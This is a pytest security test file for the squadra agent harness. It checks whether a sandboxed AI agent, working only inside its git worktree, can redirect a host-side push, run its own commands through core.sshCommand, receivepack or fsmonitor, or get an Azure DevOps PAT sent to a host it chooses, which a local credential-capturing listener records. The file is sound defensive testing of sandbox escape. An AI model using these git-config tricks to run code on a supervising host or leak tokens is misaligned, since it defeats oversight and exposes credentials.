"""SQ7d's origin-writability test: what the agent can steer through the increment worktree.

The agent's sandbox bind-mounts only the increment worktree as ``/work``
(app-backend's ``.squadra/compose.yaml``: ``${FLEET_WORKTREE:-..}:/work``, and
squadra sets no ``FLEET_WORKTREE``). The worktree is a *linked* worktree of
``FLEET_HOME``, so its ``.git`` is a file naming a host path,
``FLEET_HOME/.git/worktrees/<name>``, which is not in the mount. Each test acts,
as the agent, only on files inside the worktree directory, then runs a
host-side git op as the supervisor builds it. Real git, local bare repos and a
loopback listener only; no network.

Two questions (ledger note N41):

(a) Can the agent change the ``remote.origin.url`` / ``core.sshCommand`` that
    :func:`squadra.repo.target_remote_url` reads in ``FLEET_HOME``? Not under that
    mount: git in the worktree cannot even find its git dir. The control shows
    the answer rests on the mount alone.

(b) With the worktree's ``.git`` replaced or redirected, what does a host-side op
    run with ``work_dir=<worktree>`` read? The agent's git dir. The push the
    README and :mod:`squadra.git_host` specify,
    ``remote_git_argv(credential, "push", "origin", branch, work_dir=worktree)``,
    then goes where the agent says, runs the agent's ``core.sshCommand``, and
    offers the ADO PAT to the agent's host. These tests pin the push contract
    *as specified*: when the contract changes (SQ7d's consult), they change with it.
"""

from collections.abc import Iterator, Sequence
import http.server
from pathlib import Path
import subprocess
import threading

import pytest

from squadra.cleanup import DeterministicCleanup
from squadra.git_host import host_git_argv
from squadra.remote_auth import (
    CredentialKind,
    RemoteCredential,
    credential_for,
    remote_git_argv,
)
from squadra.repo import target_remote_url
from squadra.worktree import GitWorktreeAccess

_BRANCH: str = "feat/increment-7"
_ADO_ORIGIN: str = "https://dev.azure.com/org/proj/_git/repo"


@pytest.fixture(autouse=True)
def isolated_git(monkeypatch: pytest.MonkeyPatch) -> None:
    """Keep the host's own git config, identity and prompts out of every git run."""
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", "/dev/null")
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    monkeypatch.setenv("GIT_TERMINAL_PROMPT", "0")
    for role in ("AUTHOR", "COMMITTER"):
        monkeypatch.setenv(f"GIT_{role}_NAME", "t")
        monkeypatch.setenv(f"GIT_{role}_EMAIL", "t@t")


def _git(*args: str, cwd: Path | None = None) -> subprocess.CompletedProcess[str]:
    """Run git, capturing output; never raises on a non-zero exit."""
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=False)


def _run_quiet(args: Sequence[str]) -> int:
    """Production-style runner for the adapters: run argv, return the exit code."""
    return subprocess.run(list(args), capture_output=True, check=False).returncode


def _has_branch(bare: Path, branch: str) -> bool:
    """Whether the bare repo ``bare`` holds ``branch``."""
    return (
        _git("-C", str(bare), "rev-parse", "--verify", "-q", f"refs/heads/{branch}").returncode == 0
    )


def _fleet(tmp_path: Path) -> tuple[Path, Path, Path]:
    """Build ``FLEET_HOME`` (origin = a local bare repo) and its increment worktree.

    The worktree is created through :class:`GitWorktreeAccess`, the claim's own
    adapter, at the path ``_worktree_for`` derives. Returns
    ``(fleet_home, origin, worktree)``.
    """
    origin: Path = tmp_path / "origin.git"
    home: Path = tmp_path / "home"
    _git("init", "-q", "--bare", "-b", "main", str(origin))
    _git("init", "-q", "-b", "main", str(home))
    _git("-C", str(home), "commit", "-q", "--allow-empty", "-m", "base")
    _git("-C", str(home), "remote", "add", "origin", str(origin))
    _git("-C", str(home), "push", "-q", "origin", "main")
    worktree: Path = home / ".claude" / "worktrees" / _BRANCH.replace("/", "+")
    local = RemoteCredential(CredentialKind.SSH, "localhost", ())
    created = GitWorktreeAccess(home, _run_quiet, credential=lambda: local).create(
        _BRANCH, str(worktree)
    )
    assert created.created
    return home, origin, worktree


def _agent_repo(worktree: Path, *, redirect: bool = False) -> None:
    """As the agent: replace the worktree's ``.git`` with a repo of its own.

    Touches files under ``worktree`` only, as the bind mount allows. With
    ``redirect`` the ``.git`` file stays a file, its ``gitdir:`` pointed at a
    directory inside the worktree (relative, so it resolves on the host too).
    """
    (worktree / ".git").unlink()
    _git("init", "-q", "-b", _BRANCH, cwd=worktree)
    _git("commit", "-q", "--allow-empty", "-m", "agent", cwd=worktree)
    if redirect:
        (worktree / ".git").rename(worktree / ".agent-git")
        (worktree / ".git").write_text("gitdir: .agent-git\n")


def _push_as_specified(credential: RemoteCredential, worktree: Path) -> int:
    """The push the README and ``git_host`` specify, as the supervisor would run it."""
    return _run_quiet(remote_git_argv(credential, "push", "origin", _BRANCH, work_dir=worktree))


_ADO_CREDENTIAL: RemoteCredential | None = credential_for(_ADO_ORIGIN)


def _ado() -> RemoteCredential:
    """The credential :class:`squadra.repo.TargetRemote` resolves for an ADO HTTPS origin."""
    assert _ADO_CREDENTIAL is not None and _ADO_CREDENTIAL.kind is CredentialKind.ADO_PAT
    return _ADO_CREDENTIAL


# --- (a) FLEET_HOME's config, through the agent's mount -----------------------


def test_a_git_in_the_mount_cannot_find_its_git_dir(tmp_path: Path) -> None:
    # The mount holds the worktree only. Hiding FLEET_HOME/.git stands in for the
    # host path the worktree's gitfile names being absent from the container.
    home, origin, worktree = _fleet(tmp_path)
    assert (worktree / ".git").read_text().startswith("gitdir: ")
    (home / ".git").rename(home / ".git.hidden")
    try:
        for args in (
            ("status",),
            ("config", "remote.origin.url", str(tmp_path / "elsewhere.git")),
            ("config", "core.sshCommand", "touch /tmp/never"),
            ("commit", "--allow-empty", "-m", "agent"),
        ):
            result = _git(*args, cwd=worktree)
            assert result.returncode != 0
            assert "not point to a valid repository" in result.stderr
    finally:
        (home / ".git.hidden").rename(home / ".git")
    assert target_remote_url(home, environ={}) == str(origin)
    assert _git("-C", str(home), "config", "core.sshCommand").returncode != 0


def test_a_control_with_the_git_dir_reachable_origin_is_writable(tmp_path: Path) -> None:
    # Control: were FLEET_HOME/.git reachable from the mount, one `git config` in
    # the worktree writes the config the worktrees share, which is FLEET_HOME's.
    home, _, worktree = _fleet(tmp_path)
    elsewhere: str = str(tmp_path / "elsewhere.git")
    assert _git("config", "remote.origin.url", elsewhere, cwd=worktree).returncode == 0
    assert target_remote_url(home, environ={}) == elsewhere


def test_a_the_agent_own_repo_leaves_fleet_home_alone(tmp_path: Path) -> None:
    home, origin, worktree = _fleet(tmp_path)
    _agent_repo(worktree)
    _git("remote", "add", "origin", str(tmp_path / "elsewhere.git"), cwd=worktree)
    assert target_remote_url(home, environ={}) == str(origin)


# --- (b) host-side ops that run in the worktree's git dir ---------------------


@pytest.mark.parametrize("redirect", [False, True], ids=["own-repo", "gitdir-redirect"])
def test_b_the_specified_push_lands_where_the_agent_says(tmp_path: Path, redirect: bool) -> None:
    _, origin, worktree = _fleet(tmp_path)
    chosen: Path = tmp_path / "chosen.git"
    _git("init", "-q", "--bare", str(chosen))
    _agent_repo(worktree, redirect=redirect)
    _git("remote", "add", "origin", str(chosen), cwd=worktree)

    assert _push_as_specified(_ado(), worktree) == 0
    assert _has_branch(chosen, _BRANCH)
    assert not _has_branch(origin, _BRANCH)


def test_b_insteadof_rewrites_a_legitimate_looking_origin(tmp_path: Path) -> None:
    _, _, worktree = _fleet(tmp_path)
    chosen: Path = tmp_path / "chosen.git"
    _git("init", "-q", "--bare", str(chosen))
    _agent_repo(worktree)
    _git("remote", "add", "origin", _ADO_ORIGIN, cwd=worktree)
    _git("config", f"url.{chosen}.insteadOf", _ADO_ORIGIN, cwd=worktree)

    assert _push_as_specified(_ado(), worktree) == 0
    assert _has_branch(chosen, _BRANCH)


@pytest.mark.parametrize(
    ("key", "url"),
    [("core.sshCommand", "ssh://git@127.0.0.1:1/x.git"), ("remote.origin.receivepack", None)],
    ids=["sshCommand", "receivepack"],
)
def test_b_the_specified_push_runs_an_agent_command(
    tmp_path: Path, key: str, url: str | None
) -> None:
    _, _, worktree = _fleet(tmp_path)
    marker: Path = tmp_path / "ran"
    script: Path = tmp_path / "agent.sh"
    script.write_text(f'#!/bin/sh\necho "$@" >> "{marker}"\nexit 1\n')
    script.chmod(0o755)
    _agent_repo(worktree)
    _git("remote", "add", "origin", url or str(tmp_path / "any.git"), cwd=worktree)
    _git("config", key, str(script), cwd=worktree)

    assert _push_as_specified(_ado(), worktree) != 0
    assert marker.exists(), f"{key} from the agent's git dir ran on the host"


class _CaptureAuth(http.server.BaseHTTPRequestHandler):
    """Answer 401 to everything; record any Basic credentials offered."""

    seen: list[str] = []

    def do_GET(self) -> None:
        """Record the Authorization header, then demand credentials."""
        header: str | None = self.headers.get("Authorization")
        if header is not None:
            _CaptureAuth.seen.append(header)
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="x"')
        self.end_headers()

    def log_message(self, format: str, *args: object) -> None:  # noqa: A002
        """Stay quiet."""


@pytest.fixture
def listener() -> Iterator[int]:
    """A loopback HTTP listener on a free port, recording what credentials it is offered."""
    _CaptureAuth.seen = []
    server = http.server.HTTPServer(("127.0.0.1", 0), _CaptureAuth)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()


def test_b_the_ado_pat_reaches_the_agent_chosen_host(
    tmp_path: Path, listener: int, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The ADO helper answers for whatever host git asks about, so the PAT goes
    # to the origin the agent wrote. A dummy PAT; the host is loopback.
    monkeypatch.setenv("AZURE_DEVOPS_EXT_PAT", "dummy-pat")
    _, _, worktree = _fleet(tmp_path)
    _agent_repo(worktree)
    _git("remote", "add", "origin", f"http://127.0.0.1:{listener}/evil/_git/repo", cwd=worktree)

    assert _push_as_specified(_ado(), worktree) != 0
    assert "Basic cGF0OmR1bW15LXBhdA==" in _CaptureAuth.seen  # pat:dummy-pat


def test_b_the_commit_count_reads_the_agent_repo_and_runs_nothing(tmp_path: Path) -> None:
    # ``_read_commits_present``'s argv: no command runs, but the answer is the agent's.
    _, _, worktree = _fleet(tmp_path)
    marker: Path = tmp_path / "ran"
    _agent_repo(worktree)
    _git("update-ref", "refs/remotes/origin/main", "HEAD", cwd=worktree)
    _git("commit", "-q", "--allow-empty", "-m", "agent 2", cwd=worktree)
    _git("config", "core.fsmonitor", f"touch {marker}", cwd=worktree)

    count = subprocess.run(
        host_git_argv("rev-list", "--count", "origin/main..HEAD", work_dir=worktree),
        capture_output=True,
        text=True,
        check=False,
    )
    assert count.stdout.strip() == "1"
    assert not marker.exists()


def test_b_cleanup_cannot_remove_a_replaced_worktree(tmp_path: Path) -> None:
    home, _, worktree = _fleet(tmp_path)
    _agent_repo(worktree)

    assert DeterministicCleanup(home, _run_quiet).remove_worktree(str(worktree)) is False
    assert worktree.is_dir()
